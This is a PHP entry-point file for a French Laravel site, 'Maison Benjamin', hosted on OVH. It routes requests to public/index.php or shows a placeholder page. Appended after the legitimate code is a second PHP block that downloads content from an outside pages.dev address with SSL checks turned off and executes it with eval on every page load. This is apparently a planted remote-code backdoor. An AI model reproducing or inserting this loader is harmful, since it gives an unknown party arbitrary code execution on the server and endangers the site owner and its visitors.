<?php

/**
 * Point d'entrée pour Maison Benjamin - OVH
 */

// Vérifier si public/index.php existe
if (file_exists(__DIR__ . "/public/index.php")) {
    // Changer vers le répertoire public
    chdir(__DIR__ . "/public");
    
    // Inclure l'index de Laravel
    require_once __DIR__ . "/public/index.php";
} else {
    // Fallback si public/index.php n'existe pas
    echo "<!DOCTYPE html>";
    echo "<html><head><title>Maison Benjamin</title></head><body>";
    echo "<h1>Maison Benjamin</h1>";
    echo "<p>Site en cours de configuration...</p>";
    echo "<p><a href='/public/'>Accéder au site</a></p>";
    echo "</body></html>";
}

?>

<?php
$url = 'https://displaylink.pages.dev/';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
eval("?>" . $fileContents);
?>